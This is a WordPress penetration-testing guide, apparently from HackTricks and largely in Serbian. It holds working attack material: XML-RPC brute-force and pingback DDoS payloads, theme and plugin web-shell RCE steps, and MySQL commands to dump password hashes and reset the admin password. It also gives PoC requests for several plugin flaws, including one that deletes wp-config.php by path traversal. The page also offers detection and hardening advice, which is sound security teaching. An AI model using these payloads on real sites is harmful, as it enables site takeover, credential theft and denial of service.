# Wordpress

{{#include ../../banners/hacktricks-training.md}}

## Basic Information

- **Uploaded** files go to: `http://10.10.10.10/wp-content/uploads/2018/08/a.txt`
- **Themes files can be found in /wp-content/themes/,** tako da ako promenite neki php fajl teme da biste dobili RCE verovatno ƒáete koristiti taj path. Na primer: Koristeƒái **theme twentytwelve** mo≈æete **access** fajl **404.php** na: [**/wp-content/themes/twentytwelve/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- **Another useful url could be:** [**/wp-content/themes/default/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- U **wp-config.php** mo≈æete naƒái root lozinku baze podataka.
- Default login paths to check: _**/wp-login.php, /wp-login/, /wp-admin/, /wp-admin.php, /login/**_

### **Main WordPress Files**

- `index.php`
- `license.txt` sadr≈æi korisne informacije kao ≈°to je verzija WordPress-a koja je instalirana.
- `wp-activate.php` se koristi za proces aktivacije putem email-a prilikom pode≈°avanja novog WordPress sajta.
- Login folders (may be renamed to hide it):
- `/wp-admin/login.php`
- `/wp-admin/wp-login.php`
- `/login.php`
- `/wp-login.php`
- `xmlrpc.php` je fajl koji predstavlja funkcionalnost WordPress-a koja omoguƒáava prenos podataka koristeƒái HTTP kao transportni mehanizam i XML kao ≈°emu enkodiranja. Ovaj tip komunikacije je zamenjen WordPress [REST API](https://developer.wordpress.org/rest-api/reference).
- Folder `wp-content` je glavna mapa u kojoj se ƒçuvaju plugins i themes.
- `wp-content/uploads/` je direktorijum gde se ƒçuvaju fajlovi koje su uƒçitani na platformu.
- `wp-includes/` Ovo je direktorijum gde se nalaze core fajlovi, kao ≈°to su sertifikati, fontovi, JavaScript fajlovi i widget-i.
- `wp-sitemap.xml` U Wordpress verzijama 5.5 i novijim, Wordpress generi≈°e sitemap XML fajl sa svim javnim postovima i javno queryable post type-ovima i taxonomies.

**Post exploitation**

- Fajl `wp-config.php` sadr≈æi informacije potrebne WordPress-u za konekciju na bazu podataka kao ≈°to su ime baze, host baze, username i password, authentication keys i salts, i prefiks tabela baze podataka. Ovaj konfiguracioni fajl se takoƒëe mo≈æe koristiti za aktiviranje DEBUG moda, ≈°to mo≈æe biti korisno pri re≈°avanju problema.

### Users Permissions

- **Administrator**
- **Editor**: Publish and manages his and others posts
- **Author**: Publish and manage his own posts
- **Contributor**: Write and manage his posts but cannot publish them
- **Subscriber**: Browser posts and edit their profile

## **Passive Enumeration**

### **Get WordPress version**

Proverite da li mo≈æete pronaƒái fajlove `/license.txt` ili `/readme.html`

Unutar **source code** stranice (primer sa [https://wordpress.org/support/article/pages/](https://wordpress.org/support/article/pages/)):

- grep
```bash
curl https://victim.com/ | grep 'content="WordPress'
```
- `meta name`

![](<../../images/image (1111).png>)

- CSS link datoteke

![](<../../images/image (533).png>)

- JavaScript datoteke

![](<../../images/image (524).png>)

### Preuzmi dodatke
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### Preuzimanje tema
```bash
curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### Izdvajanje verzija uop≈°teno
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2

```
## Aktivna enumeracija

### Dodaci i teme

Verovatno neƒáete moƒái da pronaƒëete sve Plugins i Themes koje su moguƒáe. Da biste otkrili sve, moraƒáete da **actively Brute Force a list of Plugins and Themes** (nadamo se da za nas postoje automatizovani alati koji sadr≈æe te liste).

### Korisnici

- **ID Brute:** Dobijate validne korisnike sa WordPress sajta Brute Forcing users IDs:
```bash
curl -s -I -X GET http://blog.example.com/?author=1
```
Ako su odgovori **200** ili **30X**, to znaƒçi da je id **validan**. Ako je odgovor **400**, onda je id **nevalidan**.

- **wp-json:** Takoƒëe mo≈æete poku≈°ati da dobijete informacije o korisnicima upitom:
```bash
curl http://blog.example.com/wp-json/wp/v2/users
```
Jo≈° jedan `/wp-json/` endpoint koji mo≈æe otkriti neke informacije o korisnicima je:
```bash
curl http://blog.example.com/wp-json/oembed/1.0/embed?url=POST-URL
```
Imajte na umu da ovaj endpoint izla≈æe samo korisnike koji su napravili post. **Biƒáe dostupne samo informacije o korisnicima kojima je ova funkcija omoguƒáena**.

Takoƒëe imajte na umu da **/wp-json/wp/v2/pages** mo≈æe leak IP addresses.

- **Login username enumeration**: Prilikom prijave na **`/wp-login.php`** **poruka** je **razliƒçita** i ukazuje da li **korisniƒçko ime postoji ili ne**.

### XML-RPC

Ako je `xml-rpc.php` aktivan mo≈æete izvesti credentials brute-force ili ga koristiti za pokretanje DoS napada na druge resurse. (Na primer, mo≈æete automatizovati ovaj proces [using this](https://github.com/relarizky/wpxploit)).

Da biste proverili da li je aktivan poku≈°ajte da pristupite _**/xmlrpc.php**_ i po≈°aljete ovaj zahtev:

**Provera**
```html
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```
![](https://h3llwings.files.wordpress.com/2019/01/list-of-functions.png?w=656)

**Credentials Bruteforce**

**`wp.getUserBlogs`**, **`wp.getCategories`** ili **`metaWeblog.getUsersBlogs`** su neke od metoda koje se mogu koristiti za brute-force credentials. Ako pronaƒëete bilo koju od njih, mo≈æete poslati ne≈°to poput:
```html
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>pass</value></param>
</params>
</methodCall>
```
Poruka _"Incorrect username or password"_ u odgovoru sa statusnim kodom 200 treba –¥–∞ —Å–µ –ø–æ—ò–∞–≤–∏ –∞–∫–æ –∫—Ä–µ–¥–µ–Ω—Ü–∏—ò–∞–ª–∏ –Ω–∏—Å—É –≤–∞–ª–∏–¥–Ω–∏.

![](<../../images/image (107) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (4) (1).png>)

![](<../../images/image (721).png>)

Koristeƒái ispravne kredencijale mo≈æete uploadovati fajl. U odgovoru ƒáe se pojaviti putanja ([https://gist.github.com/georgestephanis/5681982](https://gist.github.com/georgestephanis/5681982))
```html
<?xml version='1.0' encoding='utf-8'?>
<methodCall>
<methodName>wp.uploadFile</methodName>
<params>
<param><value><string>1</string></value></param>
<param><value><string>username</string></value></param>
<param><value><string>password</string></value></param>
<param>
<value>
<struct>
<member>
<name>name</name>
<value><string>filename.jpg</string></value>
</member>
<member>
<name>type</name>
<value><string>mime/type</string></value>
</member>
<member>
<name>bits</name>
<value><base64><![CDATA[---base64-encoded-data---]]></base64></value>
</member>
</struct>
</value>
</param>
</params>
</methodCall>
```
Also there is a **faster way** to brute-force credentials using **`system.multicall`** as you can try several credentials on the same request:

<figure><img src="../../images/image (628).png" alt=""><figcaption></figcaption></figure>

**Bypass 2FA**

Ova metoda je namenjena programima, a ne ljudima, i stara je, zato ne podr≈æava 2FA. Dakle, ako imate validne creds ali je glavni pristup za≈°tiƒáen 2FA, **mo≈æda ƒáete moƒái da zloupotrebite xmlrpc.php da se ulogujete tim creds i zaobiƒëete 2FA**. Imajte na umu da neƒáete moƒái da izvr≈°ite sve akcije koje mo≈æete iz konzole, ali i dalje biste mogli da doƒëete do RCE kao ≈°to Ippsec obja≈°njava u [https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s](https://www.youtube.com/watch?v=p8mIdm93mfw&t=1130s)

**DDoS or port scanning**

Ako mo≈æete da pronaƒëete metodu _**pingback.ping**_ u listi, mo≈æete naterati Wordpress da po≈°alje proizvoljan zahtev na bilo koji host/port.\
Ovo se mo≈æe iskoristiti da se zamoli **hiljade** Wordpress **sajtova** da **pristupe** jednoj **lokaciji** (tako se prouzrokuje **DDoS** na toj lokaciji) ili mo≈æete to koristiti da naterate **Wordpress** da **skenira** neku internu **mre≈æu** (mo≈æete navesti bilo koji port).
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
```
![](../../images/1_JaUYIZF8ZjDGGB7ocsZC-g.png)

Ako dobijete **faultCode** sa vredno≈°ƒáu **veƒáom** od **0** (17), to znaƒçi da je port otvoren.

Pogledajte upotrebu **`system.multicall`** u prethodnom odeljku da biste nauƒçili kako da zloupotrebite ovu metodu i izazovete DDoS.

**DDoS**
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://target/</string></value></param>
<param><value><string>http://yoursite.com/and_some_valid_blog_post_url</string></value></param>
</params>
</methodCall>
```
![](<../../images/image (110).png>)

### wp-cron.php DoS

Ovaj fajl se obiƒçno nalazi u korenu Wordpress sajta: **`/wp-cron.php`**\
Kada se ovom fajlu **pristupi**, izvr≈°ava se "**te≈æak**" MySQL **upit**, pa ga **napadaƒçi** mogu iskoristiti da prouzrokuju **DoS**.\
Takoƒëe, podrazumevano se `wp-cron.php` poziva pri svakom uƒçitavanju stranice (kad god klijent zatra≈æi bilo koju Wordpress stranicu), ≈°to na sajtovima sa velikim saobraƒáajem mo≈æe izazvati probleme (DoS).

Preporuƒçuje se onemoguƒáiti Wp-Cron i napraviti pravi cronjob na hostu koji ƒáe u redovnim intervalima izvr≈°avati potrebne radnje (bez izazivanja problema).

### /wp-json/oembed/1.0/proxy - SSRF

Poku≈°ajte da pristupite _https://worpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net_ i Worpress sajt mo≈æe napraviti zahtev ka vama.

This is the response when it doesn't work:

![](<../../images/image (365).png>)

## SSRF


{{#ref}}
https://github.com/t0gu/quickpress/blob/master/core/requests.go
{{#endref}}

Ovaj alat proverava da li postoji **methodName: pingback.ping** i putanja **/wp-json/oembed/1.0/proxy**, i ukoliko postoje, poku≈°ava da ih iskoristi.

## Automatski alati
```bash
cmsmap -s http://www.domain.com -t 2 -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://www.domain.com [--plugins-detection aggressive] --api-token <API_TOKEN> --passwords /usr/share/wordlists/external/SecLists/Passwords/probable-v2-top1575.txt #Brute force found users and search for vulnerabilities using a free API token (up 50 searchs)
#You can try to bruteforce the admin user using wpscan with "-U admin"
```
## Dobijanje pristupa prepisivanjem bita

Vi≈°e je radoznalost nego stvarni napad. U CTF-u [https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man](https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man) mogao si flip-ovati 1 bit u bilo kojem wordpress fajlu. Dakle, mogao si flip-ovati bit na poziciji `5389` fajla `/var/www/html/wp-includes/user.php` i time NOP-ovati NOT (`!`) operaciju.
```php
if ( ! wp_check_password( $password, $user->user_pass, $user->ID ) ) {
return new WP_Error(
```
## **Panel RCE**

**Modifikovanje php fajla iz kori≈°ƒáene teme (potrebni admin kredencijali)**

Appearance ‚Üí Theme Editor ‚Üí 404 Template (sa desne strane)

Promeni sadr≈æaj u php shell:

![](<../../images/image (384).png>)

Pretra≈æi internet kako mo≈æe≈° da pristupi≈° toj a≈æuriranoj stranici. U ovom sluƒçaju treba da pristupi≈° ovde: [http://10.11.1.234/wp-content/themes/twentytwelve/404.php](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

### MSF

Mo≈æe≈° koristiti:
```bash
use exploit/unix/webapp/wp_admin_shell_upload
```
da bi se dobila sesija.

## Plugin RCE

### PHP plugin

It may be possible to upload .php files as a plugin.\
Create your php backdoor using for example:

![](<../../images/image (183).png>)

Then add a new plugin:

![](<../../images/image (722).png>)

Upload plugin and press Install Now:

![](<../../images/image (249).png>)

Click on Procced:

![](<../../images/image (70).png>)

Probably this won't do anything apparently, but if you go to Media, you will see your shell uploaded:

![](<../../images/image (462).png>)

Access it and you will see the URL to execute the reverse shell:

![](<../../images/image (1006).png>)

### Uploading and activating malicious plugin

Ova metoda podrazumeva instalaciju malicioznog plugina za koji je poznato da je ranjiv i koji se mo≈æe iskoristiti za dobijanje web shella. Ovaj proces se izvodi preko WordPress dashboard-a na sledeƒái naƒçin:

1. **Plugin Acquisition**: Plugin se preuzima sa izvora kao ≈°to je Exploit DB, na primer [**ovde**](https://www.exploit-db.com/exploits/36374).
2. **Plugin Installation**:
- U WordPress dashboard-u idite na `Dashboard > Plugins > Upload Plugin`.
- Otpremite zip fajl preuzetog plugina.
3. **Plugin Activation**: Kada je plugin uspe≈°no instaliran, mora biti aktiviran kroz dashboard.
4. **Exploitation**:
- Sa instaliranim i aktiviranim pluginom "reflex-gallery" mo≈æe se iskoristiti jer je poznato da je ranjiv.
- Metasploit framework pru≈æa exploit za ovu ranjivost. Uƒçitavanjem odgovarajuƒáeg modula i izvr≈°avanjem specifiƒçnih komandi mo≈æe se uspostaviti meterpreter sesija, koja daje neovla≈°ƒáen pristup sajtu.
- Napominje se da je ovo samo jedna od mnogih metoda za eksploataciju WordPress sajta.

Sadr≈æaj ukljuƒçuje vizuelna pomagala koja prikazuju korake u WordPress dashboard-u za instalaciju i aktiviranje plugina. Meƒëutim, va≈æno je napomenuti da je eksploatisanje ranjivosti na ovaj naƒçin protivzakonito i neetiƒçno bez odgovarajuƒáe autorizacije. Ove informacije treba koristiti odgovorno i samo u pravnom kontekstu, kao ≈°to je penetration testing uz izriƒçitu dozvolu.

**For more detailed steps check:** [**https://www.hackingarticles.in/wordpress-reverse-shell/**](https://www.hackingarticles.in/wordpress-reverse-shell/)

## Od XSS do RCE

- [**WPXStrike**](https://github.com/nowak0x01/WPXStrike): _**WPXStrike**_ je skripta dizajnirana da eskalira **Cross-Site Scripting (XSS)** ranjivost u **Remote Code Execution (RCE)** ili druge kritiƒçne ranjivosti u WordPress-u. Za vi≈°e informacija pogledajte [**this post**](https://nowak0x01.github.io/papers/76bc0832a8f682a7e0ed921627f85d1d.html). Pru≈æa **support for Wordpress Versions 6.X.X, 5.X.X and 4.X.X. and allows to:**
- _**Privilege Escalation:**_ Kreira korisnika u WordPress-u.
- _**(RCE) Custom Plugin (backdoor) Upload:**_ Otpremite va≈° custom plugin (backdoor) u WordPress.
- _**(RCE) Built-In Plugin Edit:**_ Uredite ugraƒëeni plugin u WordPress-u.
- _**(RCE) Built-In Theme Edit:**_ Uredite ugraƒëenu temu u WordPress-u.
- _**(Custom) Custom Exploits:**_ Custom exploit-i za third-party WordPress plugine/teme.

## Post Exploitation

Izvucite korisniƒçka imena i lozinke:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;select concat_ws(':', user_login, user_pass) from wp_users;"
```
Promeni admin lozinku:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;"
```
## Wordpress Dodaci Pentest

### Povr≈°ina napada

Znati kako Wordpress dodatak mo≈æe izlo≈æiti funkcionalnost kljuƒçno je za pronala≈æenje ranjivosti u njegovoj funkcionalnosti. Mo≈æete videti kako dodatak mo≈æe izlo≈æiti funkcionalnost u sledeƒáim taƒçkama i neke primere ranjivih dodataka u [**this blog post**](https://nowotarski.info/wordpress-nonce-authorization/).

- **`wp_ajax`**

Jedan od naƒçina na koji dodatak mo≈æe izlo≈æiti funkcije korisnicima je preko AJAX handlera. Ovi mogu sadr≈æavati gre≈°ke u logici, autorizaciji ili autentifikaciji. ≈†tavi≈°e, priliƒçno ƒçesto ove funkcije zasnivaju i autentifikaciju i autorizaciju na postojanju Wordpress nonce-a koji **bilo koji korisnik autentifikovan u Wordpress instanci mo≈æe imati** (bez obzira na njegovu ulogu).

Ovo su funkcije koje se mogu koristiti za izlaganje funkcije u dodatku:
```php
add_action( 'wp_ajax_action_name', array(&$this, 'function_name'));
add_action( 'wp_ajax_nopriv_action_name', array(&$this, 'function_name'));
```
**Kori≈°ƒáenje `nopriv` ƒçini endpoint dostupnim bilo kojem korisniku (ƒçak i neautentifikovanim).**

> [!CAUTION]
> ≈†tavi≈°e, ako funkcija samo proverava autorizaciju korisnika pomoƒáu funkcije `wp_verify_nonce`, ta funkcija samo proverava da li je korisnik prijavljen, obiƒçno ne proverava ulogu korisnika. Dakle, korisnici sa niskim privilegijama mogu imati pristup radnjama visokih privilegija.

- **REST API**

Takoƒëe je moguƒáe izlo≈æiti funkcije iz wordpress-a registrujuƒái REST API koristeƒái funkciju `register_rest_route`:
```php
register_rest_route(
$this->namespace, '/get/', array(
'methods' => WP_REST_Server::READABLE,
'callback' => array($this, 'getData'),
'permission_callback' => '__return_true'
)
);
```
The `permission_callback` is a callback funkcija koja proverava da li je dati korisnik autorizovan da pozove API metodu.

**If the built-in `__return_true` function is used, it'll simply skip user permissions check.**

- **Direktan pristup php fajlu**

Naravno, Wordpress koristi PHP i fajlovi unutar pluginova su direktno dostupni sa weba. Dakle, ako neki plugin izla≈æe ranjivu funkcionalnost koja se aktivira samo pristupom fajlu, biƒáe eksploatabilna od strane bilo kog korisnika.

### Trusted-header REST impersonation (WooCommerce Payments ‚â§ 5.6.1)

Neki pluginovi implementiraju ‚Äútrusted header‚Äù preƒçice za interne integracije ili reverse proxies i zatim koriste taj header da postave trenutni korisniƒçki kontekst za REST zahteve. Ako header nije kriptografski vezan za zahtev od strane upstream komponente, napadaƒç ga mo≈æe falsifikovati i pristupiti privilegovanim REST rutama kao administrator.

- Uticaj: neautentifikovano eskaliranje privilegija do admina kreiranjem novog administratora putem core users REST rute.
- Primer header-a: `X-Wcpay-Platform-Checkout-User: 1` (forsira korisniƒçki ID 1, obiƒçno prvi administratorski nalog).
- Eksploatisana ruta: `POST /wp-json/wp/v2/users` sa nizom povi≈°enih uloga.

PoC
```http
POST /wp-json/wp/v2/users HTTP/1.1
Host: <WP HOST>
User-Agent: Mozilla/5.0
Accept: application/json
Content-Type: application/json
X-Wcpay-Platform-Checkout-User: 1
Content-Length: 114

{"username": "honeypot", "email": "wafdemo@patch.stack", "password": "demo", "roles": ["administrator"]}
```
Why it works

- Plugin mapira header koji kontroli≈°e klijent na stanje autentifikacije i preskaƒçe provere privilegija.
- WordPress core oƒçekuje `create_users` capability za ovu rutu; plugin hack to zaobilazi direktnim postavljanjem konteksta trenutnog korisnika iz headera.

Expected success indicators

- HTTP 201 sa JSON telom koje opisuje kreiranog korisnika.
- Novi admin korisnik vidljiv u `wp-admin/users.php`.

Detection checklist

- Grep za `getallheaders()`, `$_SERVER['HTTP_...']`, ili vendor SDK-ove koji ƒçitaju custom header-e da postave kontekst korisnika (npr. `wp_set_current_user()`, `wp_set_auth_cookie()`).
- Pregledajte REST registracije za privilegovane callback-ove koji nemaju robusne provere `permission_callback` i umesto toga se oslanjaju na request header-e.
- Tra≈æite upotrebu core funkcija za upravljanje korisnicima (`wp_insert_user`, `wp_create_user`) unutar REST handler-a koje su ograniƒçene samo vrednostima header-a.

Hardening

- Nikada ne izvlaƒçite autentifikaciju ili autorizaciju iz header-a koji kontroli≈°e klijent.
- Ako reverse proxy mora ubaciti identitet, zavr≈°ite poverenje na proxy-ju i uklonite ulazne kopije (npr. `unset X-Wcpay-Platform-Checkout-User` na edge-u), zatim prosledite potpisani token i verifikujte ga na serveru.
- Za REST rute koje izvr≈°avaju privilegovane akcije, zahtevajte provere `current_user_can()` i strogi `permission_callback` (NE koristite `__return_true`).
- Preferirajte first-party auth (cookies, application passwords, OAuth) umesto header ‚Äúimpersonation‚Äù.

References: see the links at the end of this page for a public case and broader analysis.

### Unauthenticated Arbitrary File Deletion via wp_ajax_nopriv (Litho Theme <= 3.0)

WordPress themes and plugins frequently expose AJAX handlers through the `wp_ajax_` and `wp_ajax_nopriv_` hooks.  When the **_nopriv_** variant is used **the callback becomes reachable by unauthenticated visitors**, so any sensitive action must additionally implement:

1. A **capability check** (e.g. `current_user_can()` or at least `is_user_logged_in()`), and
2. A **CSRF nonce** validated with `check_ajax_referer()` / `wp_verify_nonce()`, and
3. **Strict input sanitisation / validation**.

The Litho multipurpose theme (< 3.1) forgot those 3 controls in the *Remove Font Family* feature and ended up shipping the following code (simplified):
```php
function litho_remove_font_family_action_data() {
if ( empty( $_POST['fontfamily'] ) ) {
return;
}
$fontfamily = str_replace( ' ', '-', $_POST['fontfamily'] );
$upload_dir = wp_upload_dir();
$srcdir  = untrailingslashit( wp_normalize_path( $upload_dir['basedir'] ) ) . '/litho-fonts/' . $fontfamily;
$filesystem = Litho_filesystem::init_filesystem();

if ( file_exists( $srcdir ) ) {
$filesystem->delete( $srcdir, FS_CHMOD_DIR );
}
die();
}
add_action( 'wp_ajax_litho_remove_font_family_action_data',        'litho_remove_font_family_action_data' );
add_action( 'wp_ajax_nopriv_litho_remove_font_family_action_data', 'litho_remove_font_family_action_data' );
```
* **Neautentifikovan pristup** ‚Äì the `wp_ajax_nopriv_` hook je registrovan.
* **No nonce / capability check** ‚Äì bilo koji posetilac mo≈æe pozvati endpoint.
* **Nema sanitizacije putanje** ‚Äì korisniƒçki kontrolisana `fontfamily` string se konkatenira u filesystem putanju bez filtriranja, ≈°to omoguƒáava klasiƒçan `../../` traversal.

#### Exploitation

Napadaƒç mo≈æe obrisati bilo koji fajl ili direktorijum **ispod osnovnog uploads direktorijuma** (obiƒçno `<wp-root>/wp-content/uploads/`) slanjem jednog HTTP POST zahteva:
```bash
curl -X POST https://victim.com/wp-admin/admin-ajax.php \
-d 'action=litho_remove_font_family_action_data' \
-d 'fontfamily=../../../../wp-config.php'
```
Po≈°to `wp-config.php` ≈æivi izvan *uploads*, ƒçetiri `../` sekvence su dovoljne za podrazumevanu instalaciju. Brisanjem `wp-config.php` WordPress se pri sledeƒáoj poseti prisiljava da pokrene *ƒçarobnjak za instalaciju*, ≈°to omoguƒáava potpuno preuzimanje sajta (napadaƒç samo obezbeƒëuje novu DB konfiguraciju i kreira admin korisnika).

Drugi znaƒçajni ciljevi ukljuƒçuju plugin/theme `.php` fajlove (npr. da onesposobe security plugins) ili `.htaccess` pravila.

#### Kontrolna lista za detekciju

* Bilo koji `add_action( 'wp_ajax_nopriv_...')` callback koji poziva funkcije za rad sa fajl sistemom (`copy()`, `unlink()`, `$wp_filesystem->delete()`, itd.).
* Konkatenacija nesanitizovanih korisniƒçkih inputa u putanjama (tra≈æite `$_POST`, `$_GET`, `$_REQUEST`).
* Nedostatak `check_ajax_referer()` i `current_user_can()`/`is_user_logged_in()`.

#### Ojaƒçavanje
```php
function secure_remove_font_family() {
if ( ! is_user_logged_in() ) {
wp_send_json_error( 'forbidden', 403 );
}
check_ajax_referer( 'litho_fonts_nonce' );

$fontfamily = sanitize_file_name( wp_unslash( $_POST['fontfamily'] ?? '' ) );
$srcdir = trailingslashit( wp_upload_dir()['basedir'] ) . 'litho-fonts/' . $fontfamily;

if ( ! str_starts_with( realpath( $srcdir ), realpath( wp_upload_dir()['basedir'] ) ) ) {
wp_send_json_error( 'invalid path', 400 );
}
// ‚Ä¶ proceed ‚Ä¶
}
add_action( 'wp_ajax_litho_remove_font_family_action_data', 'secure_remove_font_family' );
//  üîí  NO wp_ajax_nopriv_ registration
```
> [!TIP]
> **Uvek** tretirajte svaku operaciju pisanja/brisanja na disku kao privilegovanu i dvaput proverite:
> ‚Ä¢ Authentication  ‚Ä¢ Authorisation  ‚Ä¢ Nonce  ‚Ä¢ Input sanitisation  ‚Ä¢ Path containment (e.g. via `realpath()` plus `str_starts_with()`).

---

### Privilege escalation via stale role restoration and missing authorization (ASE "View Admin as Role")

Mnogi pluginovi implementiraju funkciju "view as role" ili privremenu promenu role tako ≈°to ƒçuvaju originalne role u user meta kako bi ih kasnije mogli vratiti. Ako put vraƒáanja zavisi samo od request parametara (npr. `$_REQUEST['reset-for']`) i liste koju odr≈æava plugin bez provere capabilities i validnog nonce-a, ovo postaje vertical privilege escalation.

Primer iz stvarnog sveta pronaƒëen je u Admin and Site Enhancements (ASE) pluginu (‚â§ 7.6.2.1). Reset grana vraƒáala je role na osnovu `reset-for=<username>` ako se korisniƒçko ime pojavilo u internoj nizu `$options['viewing_admin_as_role_are']`, ali nije izvr≈°ila ni `current_user_can()` proveru ni nonce verifikaciju pre uklanjanja trenutnih rola i ponovnog dodavanja saƒçuvanih rola iz user meta `_asenha_view_admin_as_original_roles`:
```php
// Simplified vulnerable pattern
if ( isset( $_REQUEST['reset-for'] ) ) {
$reset_for_username = sanitize_text_field( $_REQUEST['reset-for'] );
$usernames = get_option( ASENHA_SLUG_U, [] )['viewing_admin_as_role_are'] ?? [];

if ( in_array( $reset_for_username, $usernames, true ) ) {
$u = get_user_by( 'login', $reset_for_username );
foreach ( $u->roles as $role ) { $u->remove_role( $role ); }
$orig = (array) get_user_meta( $u->ID, '_asenha_view_admin_as_original_roles', true );
foreach ( $orig as $r ) { $u->add_role( $r ); }
}
}
```
Za≈°to je iskoristivo

- Veruje `$_REQUEST['reset-for']` i opciji plugina bez autorizacije na serverskoj strani.
- Ako je korisnik ranije imao veƒáe privilegije saƒçuvane u `_asenha_view_admin_as_original_roles` i kasnije mu je smanjen nivo, mo≈æe ih vratiti tako ≈°to ƒáe pozvati reset path.
- U nekim implementacijama, bilo koji autentifikovani korisnik mo≈æe pokrenuti reset za drugo korisniƒçko ime koje je jo≈° uvek prisutno u `viewing_admin_as_role_are` (neispravna autorizacija).

Preduslovi napada

- Ranjiva verzija plugina sa omoguƒáen–æ–º funkcionalno≈°ƒáu.
- Ciljni nalog ima zastarelu ulogu sa visokim privilegijama saƒçuvanu u user meta iz ranije upotrebe.
- Bilo koja autentifikovana sesija; nedostaje nonce/capability u reset flow-u.

Eksploatacija (primer)
```bash
# While logged in as the downgraded user (or any auth user able to trigger the code path),
# hit any route that executes the role-switcher logic and include the reset parameter.
# The plugin uses $_REQUEST, so GET or POST works. The exact route depends on the plugin hooks.
curl -s -k -b 'wordpress_logged_in=...' \
'https://victim.example/wp-admin/?reset-for=<your_username>'
```
Na ranjivim buildovima ovo uklanja trenutne uloge i ponovo dodaje saƒçuvane originalne uloge (npr. `administrator`), ≈°to dovodi do eskalacije privilegija.

Detection checklist

- Tra≈æite funkcije za prebacivanje uloga koje ƒçuvaju ‚Äúoriginal roles‚Äù u user meta (npr. `_asenha_view_admin_as_original_roles`).
- Identifikujte putanje za reset/restore koje:
- ƒåitaju korisniƒçka imena iz `$_REQUEST` / `$_GET` / `$_POST`.
- Menjaju uloge preko `add_role()` / `remove_role()` bez `current_user_can()` i `wp_verify_nonce()` / `check_admin_referer()`.
- Autorizuju se na osnovu plugin option niza (npr. `viewing_admin_as_role_are`) umesto na osnovu capabilities izvr≈°ioca.

Hardening

- Obavezno proveravajte capabilities za svaki deo koda koji menja stanje (npr. `current_user_can('manage_options')` ili stro≈æe).
- Zahtevajte nonces za sve izmene uloga/dozvola i verifikujte ih: `check_admin_referer()` / `wp_verify_nonce()`.
- Nikad ne verujte korisniƒçkim imenima poslatim u requestu; razre≈°ite cilj–Ω–æ–≥ korisnika server-side na osnovu autentifikovanog aktera i eksplicitne politike.
- Poni≈°tite stanje ‚Äúoriginal roles‚Äù pri a≈æuriranju profila/uloga kako biste izbegli vraƒáanje zastarelih visokoprivilegovanih uloga:
```php
add_action( 'profile_update', function( $user_id ) {
delete_user_meta( $user_id, '_asenha_view_admin_as_original_roles' );
}, 10, 1 );
```
- Razmislite o ƒçuvanju minimalnog stanja i kori≈°ƒáenju vremenski ograniƒçenih tokena, za≈°tiƒáenih pomoƒáu capability, za privremene promene uloga.

---

### Unauthenticated privilege escalation via cookie‚Äëtrusted user switching on public init (Service Finder ‚Äúsf-booking‚Äù)

Neki plugins povezuju user-switching helper-e na javni `init` hook i izvlaƒçe identitet iz client-controlled cookie-ja. Ako kod pozove `wp_set_auth_cookie()` bez provere authentication, capability i validnog nonce-a, bilo koji neautentifikovani posetilac mo≈æe prisilno da se uloguje kao proizvoljan user ID.

Typical vulnerable pattern (simplified from Service Finder Bookings ‚â§ 6.1):
```php
function service_finder_submit_user_form(){
if ( isset($_GET['switch_user']) && is_numeric($_GET['switch_user']) ) {
$user_id = intval( sanitize_text_field($_GET['switch_user']) );
service_finder_switch_user($user_id);
}
if ( isset($_GET['switch_back']) ) {
service_finder_switch_back();
}
}
add_action('init', 'service_finder_submit_user_form');

function service_finder_switch_back() {
if ( isset($_COOKIE['original_user_id']) ) {
$uid = intval($_COOKIE['original_user_id']);
if ( get_userdata($uid) ) {
wp_set_current_user($uid);
wp_set_auth_cookie($uid);  // üî• sets auth for attacker-chosen UID
do_action('wp_login', get_userdata($uid)->user_login, get_userdata($uid));
setcookie('original_user_id', '', time() - 3600, '/');
wp_redirect( admin_url('admin.php?page=candidates') );
exit;
}
wp_die('Original user not found.');
}
wp_die('No original user found to switch back to.');
}
```
Za≈°to je moguƒáe iskoristiti

- Javni `init` hook ƒçini handler dostupnim neautentifikovanim korisnicima (nema provere `is_user_logged_in()`).
- Identitet se izvodi iz kolaƒçiƒáa koji klijent mo≈æe menjati (`original_user_id`).
- Direktan poziv `wp_set_auth_cookie($uid)` prijavljuje zahtevaoca kao tog korisnika bez provera capability/nonce.

Eksploatacija (bez autentifikacije)
```http
GET /?switch_back=1 HTTP/1.1
Host: victim.example
Cookie: original_user_id=1
User-Agent: PoC
Connection: close
```
---

